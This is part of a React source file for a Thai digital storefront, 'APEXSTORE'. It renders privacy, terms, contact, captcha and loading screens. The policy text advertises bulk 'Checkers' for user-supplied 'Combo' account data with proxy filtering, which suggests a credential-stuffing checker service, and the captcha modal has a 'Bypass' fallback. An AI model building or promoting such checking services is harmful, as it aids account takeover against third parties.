          <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[800px] h-px from-transparent via-[#10b981]/50 to-transparent"></div>

          <div className="max-w-7xl mx-auto px-6 md:px-12 w-full">
            <div className="flex justify-center items-center gap-4 text-xs text-muted-foreground">
              <p>© {new Date().getFullYear()} เอเพ็กซ์สโตร์ — สงวนลิขสิทธิ์</p>
            </div>
          </div>
        </footer>

        {/* Modals */}
        <AnimatePresence>
          {showPrivacy && (
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="fixed inset-0 bg-black/40 backdrop-blur-sm flex items-center justify-center p-4 z-[100] font-sans"
            >
              <motion.div
                initial={{ scale: 0.95, opacity: 0, y: 20 }}
                animate={{ scale: 1, opacity: 1, y: 0 }}
                exit={{ scale: 0.95, opacity: 0, y: 20 }}
                transition={{ type: "spring", damping: 25, stiffness: 300 }}
                className="bg-[#09090b] border border-[#1e1e1e] border p-6 sm:p-8 max-w-3xl w-full max-h-[90vh] flex flex-col relative"
              >
                <h2 className="text-xl sm:text-2xl font-medium mb-6 text-white flex items-center gap-2">
                  <Shield className="w-6 h-6 shrink-0 text-[#10b981]" />{" "}
                  นโยบายความเป็นส่วนตัว (Privacy Policy)
                </h2>
                <div className="overflow-y-auto pr-2 sm:pr-4 space-y-6 text-sm leading-relaxed text-muted-foreground scrollbar-thin scrollbar-thumb-zinc-700 flex-1">
                  <p>
                    <strong>อัปเดตล่าสุด:</strong>{" "}
                    {new Date().toLocaleDateString("th-TH", {
                      year: "numeric",
                      month: "long",
                      day: "numeric",
                    })}
                  </p>

                  <div>
                    <h3 className="font-medium text-white text-base mb-2">
                      1. ข้อมูลที่เราเก็บรวบรวม
                    </h3>
                    <ul className="list-disc pl-5 space-y-1">
                      <li>
                        <strong>ข้อมูลระบุตัวตนและบัญชี:</strong>{" "}
                        เมื่อคุณสมัครสมาชิก เราอาจจัดเก็บข้อมูลเช่น อีเมล
                        ชื่อผู้ใช้ รหัสผ่าน (ที่ถูกเข้ารหัสและทำแฮชอย่างแน่นหนา)
                        ข้อมูลสิทธิ์การใช้งาน (Role/VIP) และเครดิตคงเหลือของคุณ
                      </li>
                      <li>
                        <strong>ข้อมูลการทำธุรกรรม (Transaction Data):</strong>{" "}
                        หากมีการทำธุรกรรมเติมเงินซื้อสินค้า
                        เราจะเก็บข้อมูลบันทึกการทำธุรกรรม เช่น เวลา จำนวนเงิน
                        หมายเลขอ้างอิง เพื่อประเมิน วิเคราะห์
                        และป้องกันการหลอกลวง
                      </li>
                      <li>
                        <strong>ข้อมูล IP Address และ Log Files:</strong>{" "}
                        ตามข้อบังคับและเพื่อความปลอดภัย เรามีการเก็บบันทึก IP
                        Address, Browser Agent, เวลาเข้าระบบ
                        และพฤติกรรมการใช้งาน
                        เพื่อใช้เป็นหลักฐานและป้องกันเหตุโจมตีระบบ (DDoS/BotNet)
                      </li>
                      <li>
                        <strong>
                          ข้อมูลการเชื่อมต่อคู่ค้า (External API):
                        </strong>{" "}
                        หากคุณผูกบัญชีบริการภายนอก เช่น Discord หรือ Telegram
                        เรามีความจำเป็นต้องดึงข้อมูลสาธารณะหรือ Token
                        ที่คุณอนุญาตเพื่อใช้ทำงานบนแพลตฟอร์มของเรา
                      </li>
                    </ul>
                  </div>

                  <div>
                    <h3 className="font-medium text-white text-base mb-2">
                      2. การปกป้องข้อมูล Combo และสินทรัพย์ของท่าน
                    </h3>
                    <p className="mb-2">
                      สำหรับการใช้เครื่องมือ Checkers ใดๆ ก็ตามบนเว็บไซต์
                      ทางแพลตฟอร์มขอยืนยันว่า{" "}
                      <strong>
                        จะไม่มีการบันทึกหรือโจรกรรมข้อมูลบัญชี/รหัสผ่านหน้าเว็บแบบเต็มจำนวนเพื่อผลประโยชน์อื่นใด
                      </strong>
                    </p>
                    <p>
                      คีย์และข้อมูลที่คุณกรอกจะถูกใช้ประมวลผลเซสชั่นชั่วคราว
                      (Volatile) ระหว่างเว็บและเซิร์ฟเวอร์
                      และข้อมูลดิบจะถูกพิจารณาล้างออกทันทีเมื่อเสร็จสิ้นรอบ
                      เพื่อสร้างความเชื่อมั่นสูงสุด 100% ให้แก่ผู้ใช้งาน
                    </p>
                  </div>

                  <div>
                    <h3 className="font-medium text-white text-base mb-2">
                      3. การเปิดเผยข้อมูลแก่บุคคลที่สาม
                    </h3>
                    <p>
                      เอเพ็กซ์สโตร์จะไม่นำข้อมูลส่วนตัว อีเมล
                      หรือเงินคงเหลือของคุณไปเปิดเผย จำหน่าย
                      หรือแลกเปลี่ยนกับบุคคลที่สามโดยเด็ดขาด <em>เว้นแต่:</em>
                    </p>
                    <ul className="list-disc pl-5 space-y-1 mt-2">
                      <li>
                        ผู้ให้บริการประมวลผลที่จำเป็น (Cloud Hosting, Payment
                        Gateway) เฉพาะส่วนที่ต้องให้บริการ
                      </li>
                      <li>
                        เป็นไปเพื่อปฏิบัติตามกฎหมาย มีคำสั่งศาล
                        หรือคำสั่งของหน่วยงานที่มีอำนาจบังคับตามกฎหมาย
                      </li>
                      <li>
                        เพื่อใช้ป้องกันและรักษาความปลอดภัยต่อชีวิต
                        หรือปกป้องทรัพย์สินของ APEXSTORE{" "}
                      </li>
                    </ul>
                  </div>

                  <div>
                    <h3 className="font-medium text-white text-base mb-2">
                      4. คุกกี้ (Cookies) และการจัดเก็บ Cache
                    </h3>
                    <p>
                      เราใช้คุกกี้ Session และ Local Storage
                      เพื่อช่วยจดจำการเข้าสู่ระบบ สถานะการทำงาน หรือตั้งค่าธีม
                      ลดภาระที่คุณต้องล็อกอินซ้ำ ไม่มีโฆษณาแทรกแซง ไม่มีการใช้
                      Tracking Pixels นำมาวิเคราะห์ขายต่อ หากคุณลบแคช
                      การเชื่อมต่อและการจดจำทั้งหมดที่คุณบันทึกไว้ในเบราว์เซอร์จะถูกล้างใหม่ทันที
                    </p>
                  </div>

                  <div>
                    <h3 className="font-medium text-white text-base mb-2">
                      5. สิทธิของเจ้าของข้อมูล (Data Subject Rights)
                    </h3>
                    <p>
                      ภายใต้กฎหมายที่มีผลบังคับ คุณมีสิทธิขอเข้าถึง แก้ไข
                      แจ้งขอสำเนา หรือลบข้อมูลบัญชีของตนเองได้บางส่วน ทั้งนี้
                      อาจมีข้อยกเว้นสำหรับประวัติการทำรายได้ ธุรกรรม
                      ข้อมูลล็อกที่ขัดกฎหมายการลบข้อมูล (Data Retention)
                      หากประสงค์ติดต่อเพื่อลบข้อมูล
                      สามารถขอความช่วยเหลือแอดมินได้ผ่านหน้าติดต่อ
                    </p>
                  </div>

                  <div>
                    <h3 className="font-medium text-white text-base mb-2">
                      6. การแก้ไขเปลี่ยนแปลงนโยบาย
                    </h3>
                    <p>
                      ระบบขอสงวนสิทธิ์ในการแก้ไขปรับปรุง
                      เปลี่ยนแปลงข้อความในนโยบายฉบับนี้โดยไม่ต้องแจ้งให้ผู้ใช้ทราบล่วงหน้า
                      โดยสามารถตรวจสอบวันได้ที่หน้าหัวข้อ “อัปเดตล่าสุด”
                      การเข้าถึงแพลตฟอร์มอย่างต่อเนื่องถือเป็นการยืนยันและการยอมรับข้อตกลงฉบับปรับปรุงแล้ว
                    </p>
                  </div>
                </div>
                <div className="pt-6 mt-6 border-t border-[#1e1e1e] border flex gap-3 flex-col sm:flex-row justify-end">
                  <button
                    onClick={() => setShowPrivacy(false)}
                    className="bg-primary text-primary-foreground hover:bg-zinc-600/25 text-[#10b981] font-medium py-3 px-8 transition-colors w-full sm:w-auto"
                  >
                    ทำความเข้าใจและปิดหน้าต่าง
                  </button>
                </div>
              </motion.div>
            </motion.div>
          )}

          {showTerms && (
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="fixed inset-0 bg-black/40 backdrop-blur-sm flex items-center justify-center p-4 z-[100] font-sans"
            >
              <motion.div
                initial={{ scale: 0.95, opacity: 0, y: 20 }}
                animate={{ scale: 1, opacity: 1, y: 0 }}
                exit={{ scale: 0.95, opacity: 0, y: 20 }}
                transition={{ type: "spring", damping: 25, stiffness: 300 }}
                className="bg-[#09090b] border border-[#1e1e1e] border p-6 sm:p-8 max-w-3xl w-full max-h-[90vh] flex flex-col relative"
              >
                <h2 className="text-xl sm:text-2xl font-medium mb-6 flex items-center gap-2 text-white">
                  <ListChecks className="w-6 h-6 shrink-0 text-[#10b981]" />{" "}
                  ข้อกำหนดการใช้งาน (Terms of Use)
                </h2>
                <div className="overflow-y-auto pr-2 sm:pr-4 space-y-6 text-sm leading-relaxed text-muted-foreground scrollbar-thin scrollbar-thumb-zinc-700 flex-1">
                  <div>
                    <h3 className="font-medium text-white text-base mb-2">
                      1. การรับรองความยินยอมและผูกพัน
                    </h3>
                    <p>
                      การเข้าถึงและใช้งานบริการ เครื่องมือตรวจสอบ บอท
                      และผลิตภัณฑ์ของเรา
                      ถือเป็นการรับรองว่าท่านได้ทำความเข้าใจและตกลงยอมรับเงื่อนไขการใช้บริการของ{" "}
                      <strong>APEXSTORE</strong> อย่างครบถ้วนทุกประการ
                      หากคุณไม่เห็นด้วยกับกฎหมายและข้อบังคับเหล่านี้กรุณายุติการเข้าถึงและการใช้งานโดยทันที
                    </p>
                  </div>

                  <div>
                    <h3 className="font-medium text-white text-base mb-2">
                      2. ขอบเขตสิทธิ์ หน้าที่ และการใช้งานที่ยอมรับได้ (AUP)
                    </h3>
                    <p className="mb-2">
                      คุณตกลงที่จะใช้สิทธิ์ในการเข้าถึงที่เรารับรอง
                      เพื่อจุดประสงค์ส่วนตัวที่ถูกต้องตามกฎหมาย และยินยอมที่จะ{" "}
                      <strong>ไม่กระทำ</strong> สิ่งเหล่านี้ไม่ว่ากรณีใดๆ :
                    </p>
                    <ul className="list-disc pl-5 space-y-1">
                      <li>
                        <strong>
                          ห้ามวิศวกรรมย้อนกลับ (No Reverse Engineering):
                        </strong>{" "}
                        ห้ามดัดแปลง ชำแหละเจาะระบบ สแกนพอร์ต จำลอง API เถื่อน นำ
                        API ผิดกฎหมายหรือ Bypass
                        เข้าใช้บริการของเราโดยไม่ได้รับอนุญาต
                      </li>
                      <li>
                        <strong>
                          ห้ามกระทำละเมิดแพลตฟอร์มรุนแรง (Anti-DDoS, Spamming):
                        </strong>{" "}
                        ห้ามทดสอบความปลอดภัย ก่อความล่าช้า หรือกระหน่ำยิงแพ็กเกจ
                        (Flood Requests) เพื่อทำลายความเสถียรของเซิร์ฟเวอร์
                      </li>
                      <li>
                        <strong>ข้อพิพาทความเป็นเจ้าของข้อมูลส่วนบุคคล:</strong>{" "}
                        ผู้ใช้งานจะต้องเป็นเจ้าของข้อมูล พาสเวิร์ด คีย์ บัญชี
                        หรือมีสิทธิ์อนุญาตโดยชอบธรรมเท่านั้น
                        หากท่านนำไปใช้งานในทางละเมิดผู้อื่น สิทธิ
                        ความรับผิดชอบทางกฎหมายใดๆ
                        ถือเป็นความรับผิดชอบของตัวลูกค้า/ผู้ใช้งานโดยเพียงผู้เดียวเท่านั้น
                        ทางทีมงานจะไม่มีส่วนรู้เห็นในทุกกรณี
                      </li>
                      <li>
                        <strong>การบ่อนทำลาย/แอบอ้าง:</strong> ห้ามคัดลอก
                        ทำสำเนาเนื้อหา และผลิตภัณฑ์เพื่อไปชุบมือเปิบ แอบอ้าง
                        หรือขายนอกแพลตฟอร์มโดยไม่ได้รับอนุญาต
                      </li>
                    </ul>
                  </div>

                  <div>
                    <h3 className="font-medium text-white text-base mb-2">
                      3. การชำระเงิน การเติมเงิน และนโยบายล้างบางเครดิต (No
                      Refund Policy)
                    </h3>
                    <p className="mb-2">
                      เมื่อคุณยืนยันเติมเครดิต ชำระคีย์ โอนเงินซื้อบัญชี
                      หรือสินค้าดิจิทัลใน APEXSTORE คำสั่งซื้อดังกล่าว{" "}
                      <strong>
                        ไม่สามารถคืนเป็นเงินสด (Non-Refundable) ในทุกกรณี
                      </strong>{" "}
                      เครดิตในรหัสไม่สามารถโยกย้ายข้ามผู้ใช้ได้
                      หากพบความผิดปกติของการเติมเงิน บัตรปลอม หรือการโกง
                      แอดมินมีสิทธิเต็มที่ในการเพิกถอนยอด ล็อคแบน
                      และยึดสินค้าทั้งหมดทันที
                    </p>
                    <p>
                      สินค้ารับประกันการใช้งาน
                      จะถูกอ้างอิงตามระยะเวลาประกันของสินค้าชิ้นนั้นๆ
                      หากเลยเงื่อนไขที่กำหนดไว้จะไม่รับผิดชอบทุกกรณี
                    </p>
                  </div>

                  <div>
                    <h3 className="font-medium text-white text-base mb-2">
                      4. ข้อยกเว้นและข้อจำกัดความรับผิดชอบ (Disclaimer)
                    </h3>
                    <p className="mb-2">
                      การทำธุรกรรมและเครื่องมือนี้ ทำงานในรูปแบบ "ตามสภาพ (As
                      is)" เราไม่รับประกัน 100% ว่าไม่มีข้อบกพร่อง การขัดข้อง
                      ล่าช้า หรือผลเช็คต่างๆ จะแม่นยำเสมอไป
                      ทั้งนี้เครื่องมือเราไร้สถานะ (No-Affiliation)
                      ต่อนายจ้างหรือบริษัทแม่ของช่องโซเชียลนั้นๆ
                    </p>
                    <p>
                      เราจะไม่รับผิดชอบจากความสูญเสีย โดนแบน ยอดวิวตก
                      หรือความเสียหายในทางอ้อม ทางการค้า
                      หรือทางปกครองที่เกิดจากการเข้าใช้บริการ ข้อมูลต่างๆ
                      สามารถเข้าถึงได้ขึ้นอยู่กับความเสี่ยงของตนเอง
                    </p>
                  </div>

                  <div>
                    <h3 className="font-medium text-white text-base mb-2">
                      5. สิทธิของการยุติการให้บริการ และ IP Ban
                    </h3>
                    <p>
                      ทีมงาน APEXSTORE ถือสิทธิเด็ดขาดสูงสุดในการเตะ
                      หรือถอดถอนผู้ใช้ ระงับบัญชี (Ban)
                      เปลี่ยนแปลงแก้ไขการใช้งาน และระงับช่องทางการเข้าถึง (IP
                      Blocking) โดยไม่ต้องแจ้งตักเตือนรวมถึงชดใช้ค่าเสียหายใดๆ
                      ให้แก่ผู้ใช้งาน หากพบการทุจริต หรือคุกคามเจ้าหน้าที่
                    </p>
                  </div>

                  <div>
                    <h3 className="font-medium text-white text-base mb-2">
                      6. การจัดการและระบบต่างๆ
                    </h3>
                  </div>
                  <div>
                    <h3 className="font-medium text-white text-base mb-2">
                      ระบบและบริการของเรา
                    </h3>
                    <ul className="list-disc pl-5">
                      <li>
                        <strong>ระบบตรวจสอบไอดี (ตัวเช็ค):</strong>
                        ทรงพลังที่รองรับบัญชีจำนวนมากพร้อมกัน
                        โดยไม่สูญเสียความแม่นยำ พร้อมเทคโนโลยีคัดกรอง Proxy
                        ที่ทันสมัย
                      </li>
                      <li>
                        <strong>Discord & Telegram Connect API:</strong>{" "}
                        ให้บริการระบบดึงข้อมูล ยืนยันสลิป การรับยศบอท (Auto
                        Role) และสิทธิพิเศษการจำลองเซิร์ฟเวอร์แบบเบ็ดเสร็จ
                      </li>
                      <li>
                        <strong>Digital Marketplace & VIP Tiers:</strong>{" "}
                        ร้านค้าจำหน่ายผลิตภัณฑ์ซอฟต์แวร์ คีย์โปรแกรม
                        และคลังบัญชีพรีเมียม สำหรับลูกค้าสายโซเชียล
                        รวมถึงลูกค้าองค์กร ด้วยระบบจัดการคลัง Stock ที่รวดเร็ว
                        ตัดยอดและส่งสินค้าผ่านระบบอัตโนมัติตลอด 24 ชั่วโมง
                      </li>
                    </ul>
                  </div>

                  <div>
                    <h3 className="font-medium text-white text-base mb-2">
                      ความมุ่งมั่นด้านความปลอดภัย (Security Commitment)
                    </h3>
                    <p>
                      รากฐานของโปรเจ็กต์คือการเก็บรักษาข้อมูลให้เป็นความลับ
                      (Confidentiality)
                      สถาปัตยกรรมเซิร์ฟเวอร์ของเรามีระบบการแฮชคีย์รหัสผ่าน
                      การลดพึ่งพิงฐานข้อมูลที่เก็บรอยนิ้วมือของผู้ใช้ (Zero
                      Logging Policy สำหรับเครดิตการเช็ค)
                      และขับเคลื่อนเซิร์ฟเวอร์ด้วย Proxy ป้องกันการรุกล้ำ
                      ทำให้ข้อมูลการทำธุรกรรมของคุณได้รับการการันตี 100%
                      ภายใต้ความน่าเชื่อถือของแพลตฟอร์ม
                    </p>
                  </div>

                  <div>
                    <h3 className="font-medium text-white text-base mb-2">
                      ช่องทางติดต่อคอมมูนิตี้ (Contact & Community)
                    </h3>
                    <p className="mb-2">
                      เราไม่ได้มีแต่เว็บขายของ
                      แต่เราเติบโตด้วยแรงสุนทรีย์ของคอมมูนิตี้
                      หากคุณประสบปัญหาในการใช้งาน พบช่องโหว่
                      หรืออยากพูดคุยเสนอแนวทางใหม่ๆ:
                    </p>
                    <ul className="list-disc pl-5">
                      <li>
                        <strong>Discord Server:</strong> สถานที่เชื่อมสัมพันธ์
                        ร้องขอเครดิต หรือสอบถามการเซ็ตอัปบอท
                      </li>
                      <li>
                        <strong>Line Official:</strong> ทีม Support
                        โดยผู้ดูแลมืออาชีพ (ตอบกลับรวดเร็วที่สุด)
                      </li>
                    </ul>
                    <p className="mt-2 text-muted-foreground italic">
                      "ขอบคุณผู้ใช้งานและพันธมิตรทุกคน
                      ที่เล็งเห็นคุณค่าและก้าวเดินไปพร้อมกับ APEXSTORE
                      ขวากหนามทางดิจิทัลไหนที่ยาก... เราพร้อมเบิกทางให้คุณ"
                    </p>
                  </div>
                </div>
                <div className="pt-6 mt-6 border-t border-[#1e1e1e] border flex justify-end w-full">
                  <button
                    onClick={() => setShowAboutUs(false)}
                    className="bg-primary text-primary-foreground hover:bg-zinc-600/25 text-[#10b981] font-medium py-3 px-8 transition-all w-full sm:w-auto"
                  >
                    ปิดหน้าต่างนี้
                  </button>
                </div>
              </motion.div>
            </motion.div>
          )}

          {showContactUs && (
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="fixed inset-0 bg-black/40 backdrop-blur-sm flex items-center justify-center p-4 z-[100] font-sans"
            >
              <motion.div
                initial={{ scale: 0.95, opacity: 0, y: 20 }}
                animate={{ scale: 1, opacity: 1, y: 0 }}
                exit={{ scale: 0.95, opacity: 0, y: 20 }}
                transition={{ type: "spring", damping: 25, stiffness: 300 }}
                className="bg-[#09090b] border border-[#1e1e1e] border p-6 sm:p-8 max-w-md w-full flex flex-col relative"
              >
                <div className="flex items-center justify-between mb-6">
                  <h2 className="text-xl sm:text-2xl font-medium flex items-center gap-2 text-white">
                    <Phone className="w-6 h-6 shrink-0 text-[#10b981]" />{" "}
                    ติดต่อเรา
                  </h2>
                  <button
                    onClick={() => setShowContactUs(false)}
                    className="p-2 hover:bg-white/10 transition-colors"
                  >
                    <X className="w-5 h-5 text-muted-foreground" />
                  </button>
                </div>

                <div className="space-y-4">
                  <a
                    href="https://discord.gg/EvFjgkSB4W"
                    target="_blank"
                    rel="noreferrer"
                    className="flex items-center gap-4 p-4 bg-[#09090b] hover:bg-[#5865F2]/20 border border-[#5865F2]/20 text-white transition-all group"
                  >
                    <div className="w-12 h-12 bg-[#09090b] flex items-center justify-center shrink-0 group-hover:scale-110 transition-transform">
                      <span className="font-medium text-xl block">D</span>
                    </div>
                    <div>
                      <h3 className="font-medium text-lg">Discord</h3>
                      <p className="text-muted-foreground text-sm">
                        เข้าร่วมเซิร์ฟเวอร์ของเรา
                      </p>
                    </div>
                  </a>

                  {siteSettings?.contact_email && (
                    <a
                      href={`mailto:${siteSettings.contact_email}`}
                      className="flex items-center gap-4 p-4 bg-[#09090b] hover:bg-[#1e1e1e] border border-[#1e1e1e] border hover:border-[#1e1e1e] text-white transition-all group"
                    >
                      <div className="w-12 h-12 bg-[#09090b] flex items-center justify-center shrink-0 group-hover:scale-110 transition-transform">
                        <Mail className="w-6 h-6" />
                      </div>
                      <div>
                        <h3 className="font-medium text-lg">Email</h3>
                        <p className="text-muted-foreground text-sm">
                          {siteSettings.contact_email}
                        </p>
                      </div>
                    </a>
                  )}
                </div>

                <div className="pt-6 mt-6 border-t border-[#1e1e1e] border flex justify-end w-full">
                  <button
                    onClick={() => setShowContactUs(false)}
                    className="bg-primary text-primary-foreground hover:bg-zinc-600/25 text-[#10b981] font-medium py-3 px-8 transition-all w-full sm:w-auto"
                  >
                    ปิดหน้าต่างนี้
                  </button>
                </div>
              </motion.div>
            </motion.div>
          )}
        </AnimatePresence>

        <Suspense fallback={null}>
          <KeyModal
            show={showKeyModal}
            onClose={() => setShowKeyModal(false)}
            vipTab={vipTab}
            redeemKey={redeemKey}
            userEmail={user?.email}
          />
        </Suspense>

        {/* Turnstile Modal */}
        {showTurnstileModal && (
          <div className="fixed inset-0 bg-black/40 backdrop-blur-sm flex items-center justify-center p-4 z-[70] font-sans animate-in zoom-in-95 duration-200">
            <div className="bg-[#09090b] border border-[#1e1e1e] border p-6 sm:p-8 max-w-sm w-full relative overflow-hidden flex flex-col items-center">
              <div className="bg-[#09090b] border border-[#1e1e1e] border mb-2 relative overflow-hidden w-full h-[58px]">
                <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[110%] scale-[0.92] flex justify-center">
                  {TURNSTILE_SITE_KEY ? (
                    <Turnstile
                      siteKey={TURNSTILE_SITE_KEY}
                      options={{ theme: "dark", size: "flexible" }}
                      onSuccess={(token) => {
                        setPendingTurnstileToken(token);
                        setShowTurnstileModal(false);
                        executeCheck(token, savedLinesToCheck).catch(
                          console.error,
                        );
                      }}
                    />
                  ) : (
                    <div className="p-3 bg-primary text-primary-foreground text-[#10b981] text-center text-[10px] font-medium w-full mx-8">
                      ยังไม่ได้ตั้งค่า TURNSTILE_SITE_KEY (Bypass Mode
                      Active)
                    </div>
                  )}
                </div>
              </div>
              {!TURNSTILE_SITE_KEY && (
                <button
                  onClick={() => {
                    setShowTurnstileModal(false);
                    executeCheck("bypass", savedLinesToCheck).catch(
                      console.error,
                    );
                  }}
                  className="w-full bg-primary text-primary-foreground hover:bg-[#10b981] text-white font-medium py-3.5 transition-all mb-4"
                >
                  ดำเนินการต่อ (Bypass)
                </button>
              )}
              <button
                onClick={() => setShowTurnstileModal(false)}
                className="text-[10px] font-medium text-muted-foreground hover:text-zinc-400 transition-colors uppercase tracking-widest mt-2"
              >
                Cancel
              </button>
            </div>
          </div>
        )}

        {/* Modals */}
        <Suspense fallback={null}>
          <SearchView 
            isOpen={showSearchPopup} 
            onClose={() => setShowSearchPopup(false)} 
            products={products} 
            onProductClick={(id) => { 
              setSelectedProductId(id); 
              setActiveView("product_detail"); 
              setShowSearchPopup(false);
            }} 
          />
          {purchasedItemReceipt && (
            <ReceiptModal
              selectedItem={purchasedItemReceipt}
              setSelectedItem={(item) => {
                setPurchasedItemReceipt(item);
                // When modal is manually closed
                if (!item) {
                  setActiveView("history");
                }
              }}
            />
          )}
        </Suspense>

      </div>

      {/* Mobile Bottom Navigation Bar removed as per request */}
    </div>
  );
}

const PortalLoader: React.FC = () => {
  const [msgIdx, setMsgIdx] = useState(0);
  const [progress, setProgress] = useState(0);
  
  const messages = [
    "กำลังเข้าสู่แพลตฟอร์ม APEX STORE...",
    "กำลังเชื่อมต่อกับฐานข้อมูลหลัก...",
    "กำลังซิงค์ข้อมูลหมวดหมู่และคอลเลกชันสินค้า...",
    "กำลังรักษาความปลอดภัยช่องทางเซสชัน...",
    "ยินดีต้อนรับ! กำลังตั้งค่าสถานะหน้าแรก..."
  ];

  useEffect(() => {
    const msgInterval = setInterval(() => {
      setMsgIdx((prev) => (prev + 1) % messages.length);
    }, 1200);

    const progressInterval = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 98) {
          clearInterval(progressInterval);
          return 98;
        }
        return prev + Math.floor(Math.random() * 6) + 3;
      });
    }, 80);

    return () => {
      clearInterval(msgInterval);
      clearInterval(progressInterval);
    };
  }, []);

  return (
    <div className="min-h-screen w-full bg-[#000000] flex flex-col items-center justify-center font-sans overflow-hidden relative">
      {/* Decorative backdrop elements */}
      
      <motion.div
        initial={{ opacity: 0, scale: 0.95 }}
        animate={{ opacity: 1, scale: 1 }}
        transition={{ duration: 0.6 }}
        className="relative flex flex-col items-center justify-center z-10 max-w-sm px-6 text-center select-none"
      >
        {/* Glow backdrop behind Logo */}
        <div className="relative mb-6">
          <div className="absolute inset-0 bg-neon-green/15  rounded-full scale-90 " />
          <motion.img
            src="https://img2.pic.in.th/983B3DCE-90A3-4822-8940-D6B81CCA63A3.png"
            alt="APEXSTORE Logo"
            className="h-16 md:h-18 object-contain relative z-10 filter "
            animate={{
              scale: [0.97, 1.03, 0.97],
            }}
            transition={{
              duration: 2.5,
              repeat: Infinity,
              ease: "easeInOut"
            }}
          />
        </div>

        {/* Dynamic percentage */}
        <div className="flex items-center justify-between w-60 mb-2">
          <span className="text-[10px] font-semibold font-mono text-neon-green tracking-widest uppercase">System Initialization</span>
          <span className="text-xs font-semibold font-mono text-neon-green">{Math.min(progress, 99)}%</span>
        </div>

        {/* Glowing Linear Progress Bar */}
        <div className="w-60 bg-zinc-950 border border-[#1e1e1e] h-2 rounded-full overflow-hidden p-0.5 mb-6">
          <div 
            className="h-full bg-[#09090b] rounded-full shadow-sm transition-all duration-150 ease-out"
            style={{ width: `${Math.min(progress, 100)}%` }}
          />
        </div>

        {/* Loading details */}
        <div className="flex flex-col items-center gap-2 h-14">
          <span className="text-zinc-500 font-mono text-[9px] tracking-widest uppercase flex items-center gap-1.5 justify-center">
            <span className="w-1 h-1 rounded-full bg-neon-green animate-ping" />
            <span>CONNECTING PROTOCOL</span>
          </span>
          <div className="text-xs font-medium text-white/50 tracking-wide">
            {messages[msgIdx]}
          </div>
        </div>
      </motion.div>
    </div>
  );
};

export default function App() {
  return (
    <GlobalErrorBoundary>
      <BrowserRouter>
        <Routes>
          <Route path="*" element={<AppContent />} />
        </Routes>
      </BrowserRouter>
      <Analytics />
      <SpeedInsights />
      <ToastContainer />
    </GlobalErrorBoundary>
  );
}
